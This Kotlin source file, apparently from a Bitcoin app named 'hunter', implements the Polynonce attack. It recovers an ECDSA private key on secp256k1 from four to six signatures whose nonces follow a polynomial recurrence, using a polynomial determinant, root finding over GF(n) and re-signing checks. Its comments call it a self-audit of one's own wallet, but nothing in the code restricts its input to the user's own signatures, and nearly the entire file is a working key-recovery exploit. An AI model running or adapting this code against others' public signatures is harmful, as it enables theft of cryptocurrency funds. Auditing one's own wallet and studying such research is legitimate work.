package com.hunter.btc

import java.math.BigInteger

/**
 * El ataque Polynonce (Kudelski Security, 2023 — DEF CON 31).
 *
 * En ECDSA cada firma cumple  s = k⁻¹·(z + r·d)  mod n, así que el nonce se despeja como una recta en
 * la clave privada:  k = z/s + (r/s)·d = a + b·d  (mod n). Es decir, cada nonce es un polinomio de
 * grado 1 en la incógnita d.
 *
 * Si el generador del monedero es malo y los nonces de varias firmas de LA MISMA clave siguen una
 * recurrencia polinómica  k_{i+1} = f(k_i)  con f de grado D (D=1 es una recta, D=2 una parábola…),
 * entonces el sistema de D+1 coeficientes de f con D+2 ecuaciones sólo es compatible cuando cierto
 * determinante (D+2)×(D+2), cuyas entradas son esos polinomios en d, se anula. Ese determinante es un
 * polinomio P(d) sobre GF(n) y la clave privada es una de sus raíces. Hacen falta D+3 firmas (lineal: 4,
 * cuadrática: 5, cúbica: 6).
 *
 * Las raíces en GF(n) se sacan de verdad: g = mcd(P, xⁿ − x) deja el producto de las raíces, y
 * Cantor–Zassenhaus las separa. Cada candidata se confirma volviendo a firmar (r == x(k·G)), así que
 * nunca se da por buena una clave mal calculada.
 *
 * El "half-half" (nonces donde se comparte media palabra) es, según los propios autores, un caso que
 * este mismo ataque resuelve, por eso no lleva motor aparte.
 *
 * Es una AUTOAUDITORÍA: pruebas TUS firmas para ver si tu monedero generó nonces relacionados. No ataca
 * a nadie. El motor es Kotlin puro (BigInteger) para poder probarlo en la JVM; d se confirma con una
 * lambda [verificar] que el que llama implementa con la curva (nativa en la app, lenta en las pruebas).
 */
object Polynonce {
    val N = BigInteger("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)
    private val Z = BigInteger.ZERO
    private val ONE = BigInteger.ONE
    private val HALF = N.subtract(ONE).shiftRight(1)   // (n-1)/2, entero porque n es impar

    class Firma(val r: BigInteger, val s: BigInteger, val z: BigInteger)

    private fun m(a: BigInteger): BigInteger = a.mod(N)

    // ── polinomios sobre GF(n): lista de coeficientes, índice i = grado i ──
    private fun trim(p: ArrayList<BigInteger>): ArrayList<BigInteger> {
        while (p.size > 1 && p[p.size - 1].signum() == 0) p.removeAt(p.size - 1)
        return p
    }
    private fun esCero(p: List<BigInteger>) = p.size == 1 && p[0].signum() == 0
    private fun grado(p: List<BigInteger>) = p.size - 1
    private fun padd(a: List<BigInteger>, b: List<BigInteger>): ArrayList<BigInteger> {
        val n = maxOf(a.size, b.size); val o = ArrayList<BigInteger>(n)
        for (i in 0 until n) o.add(m((if (i < a.size) a[i] else Z) + (if (i < b.size) b[i] else Z)))
        return trim(o)
    }
    private fun psub(a: List<BigInteger>, b: List<BigInteger>): ArrayList<BigInteger> {
        val n = maxOf(a.size, b.size); val o = ArrayList<BigInteger>(n)
        for (i in 0 until n) o.add(m((if (i < a.size) a[i] else Z) - (if (i < b.size) b[i] else Z)))
        return trim(o)
    }
    private fun pmul(a: List<BigInteger>, b: List<BigInteger>): ArrayList<BigInteger> {
        val o = ArrayList<BigInteger>(a.size + b.size); for (i in 0 until a.size + b.size - 1) o.add(Z)
        for (i in a.indices) { if (a[i].signum() == 0) continue
            for (j in b.indices) o[i + j] = m(o[i + j] + a[i] * b[j]) }
        return trim(o)
    }
    private fun monico(p0: List<BigInteger>): ArrayList<BigInteger> {
        val p = ArrayList(p0); trim(p); if (esCero(p)) return p
        val inv = p[p.size - 1].modInverse(N); val o = ArrayList<BigInteger>(p.size)
        for (c in p) o.add(m(c * inv)); return o
    }
    /** (cociente, resto) de a entre b; b ≠ 0. */
    private fun pdivmod(a: List<BigInteger>, b: List<BigInteger>): Pair<ArrayList<BigInteger>, ArrayList<BigInteger>> {
        val r = ArrayList(a.map { m(it) }); trim(r)
        val db = grado(b); val invLb = b[b.size - 1].modInverse(N)
        val q = ArrayList<BigInteger>(); for (i in 0..maxOf(0, grado(r) - db)) q.add(Z)
        while (!esCero(r) && grado(r) >= db) {
            val sh = grado(r) - db; val coef = m(r[r.size - 1] * invLb)
            if (sh < q.size) q[sh] = coef
            for (i in 0..db) r[sh + i] = m(r[sh + i] - coef * b[i])
            trim(r)
        }
        return trim(q) to r
    }
    private fun pmod(a: List<BigInteger>, b: List<BigInteger>) = pdivmod(a, b).second
    private fun pgcd(a0: List<BigInteger>, b0: List<BigInteger>): ArrayList<BigInteger> {
        var a = ArrayList(a0.map { m(it) }); trim(a); var b = ArrayList(b0.map { m(it) }); trim(b)
        while (!esCero(b)) { val r = pmod(a, b); a = b; b = r }
        return a
    }
    /** base^e mod módulo, con e un entero grande. */
    private fun pmodpow(base: List<BigInteger>, e: BigInteger, modulo: List<BigInteger>): ArrayList<BigInteger> {
        var result = arrayListOf(ONE); var b = pmod(base, modulo); var ee = e
        while (ee.signum() > 0) {
            if (ee.testBit(0)) result = pmod(pmul(result, b), modulo)
            ee = ee.shiftRight(1); if (ee.signum() > 0) b = pmod(pmul(b, b), modulo)
        }
        return result
    }
    /** Determinante de una matriz de polinomios (Laplace por la primera fila; matrices muy pequeñas). */
    private fun det(mx: List<List<List<BigInteger>>>): ArrayList<BigInteger> {
        val n = mx.size
        if (n == 1) return ArrayList(mx[0][0])
        var acc = arrayListOf(Z)
        for (c in 0 until n) {
            if (esCero(mx[0][c])) continue
            val menor = mx.drop(1).map { fila -> fila.filterIndexed { j, _ -> j != c } }
            var termino = pmul(mx[0][c], det(menor))
            if (c % 2 == 1) termino = psub(arrayListOf(Z), termino)
            acc = padd(acc, termino)
        }
        return acc
    }

    /** Raíces de P en GF(n): g = mcd(P, xⁿ−x) y Cantor–Zassenhaus. */
    private fun raices(P: List<BigInteger>, cancel: () -> Boolean): List<BigInteger> {
        if (esCero(P) || grado(P) < 1) return emptyList()
        val xN = pmodpow(arrayListOf(Z, ONE), N, P)             // xⁿ mod P
        val g0 = pmod(psub(xN, arrayListOf(Z, ONE)), P)         // (xⁿ − x) mod P
        return separar(monico(pgcd(P, g0)), cancel)
    }
    private fun separar(g: List<BigInteger>, cancel: () -> Boolean): List<BigInteger> {
        if (esCero(g) || grado(g) < 1) return emptyList()
        if (grado(g) == 1) return listOf(m(N - g[0]))           // mónico x + g0 ⇒ raíz −g0
        val rnd = java.security.SecureRandom()
        repeat(96) {
            if (cancel()) return emptyList()
            val delta = BigInteger(256, rnd).mod(N)
            val h = pmodpow(arrayListOf(delta, ONE), HALF, g)   // (x+δ)^((n−1)/2) mod g
            val f1 = pgcd(g, psub(h, arrayListOf(ONE)))
            val df = grado(f1)
            if (!esCero(f1) && df in 1 until grado(g)) {
                val otro = pdivmod(g, f1).first
                return separar(monico(f1), cancel) + separar(monico(otro), cancel)
            }
        }
        return emptyList()
    }

    /**
     * Intenta recuperar la clave privada de un conjunto de firmas de la misma clave, probando grados 1..[maxGrado].
     * Para cada grado D usa D+3 firmas y, por la normalización low-S (que puede haber negado algunas s), prueba las
     * combinaciones de signo de s cuando hay pocas firmas. Devuelve d (hex de 64) o null.
     */
    fun recuperar(firmas: List<Firma>, maxGrado: Int = 3, cancel: () -> Boolean = { false },
                  verificar: (BigInteger) -> Boolean): BigInteger? {
        for (D in 1..maxGrado) {
            val need = D + 3
            if (firmas.size < need || cancel()) continue
            val uso = firmas.take(need); val mm = uso.size
            val combos = if (mm <= 7) (1 shl mm) else 1     // low-S: prueba signos sólo si son pocas
            for (mask in 0 until combos) {
                if (cancel()) return null
                val K = try {
                    uso.mapIndexed { i, sg ->
                        val s = if ((mask shr i) and 1 == 1) N - sg.s else sg.s
                        if (s.signum() == 0) throw ArithmeticException()
                        val inv = s.modInverse(N)
                        listOf(m(sg.z * inv), m(sg.r * inv))        // K_i(d) = a_i + b_i·d
                    }
                } catch (e: Throwable) { continue }
                // Matriz (D+2)×(D+2): fila i (0..D+1) = [K_i⁰, K_i¹, …, K_i^D, K_{i+1}]
                val filas = (0..D + 1).map { i ->
                    val row = ArrayList<List<BigInteger>>(D + 2)
                    var cur: List<BigInteger> = arrayListOf(ONE)
                    for (j in 0..D) { row.add(cur); cur = pmul(cur, K[i]) }
                    row.add(K[i + 1]); row
                }
                val P = det(filas)
                if (esCero(P) || grado(P) < 1) continue
                for (r in raices(P, cancel)) {
                    if (r.signum() != 0 && r < N && verificar(r)) return r
                }
            }
        }
        return null
    }

    /** Comprueba que d reproduce la firma: r == x(k·G) con k = (z + r·d)/s. [xDeKG] da la x de k·G mod n. */
    fun confirma(d: BigInteger, firmas: List<Firma>, xDeKG: (BigInteger) -> BigInteger?): Boolean {
        var ok = 0
        for (sg in firmas) {
            val s = sg.s; if (s.signum() == 0) continue
            val k = m((sg.z + sg.r * d) * s.modInverse(N))
            if (k.signum() == 0) continue
            val x = xDeKG(k) ?: continue
            if (m(x) == m(sg.r)) { ok++; if (ok >= 2) return true } else return false
        }
        return ok >= 1
    }
}
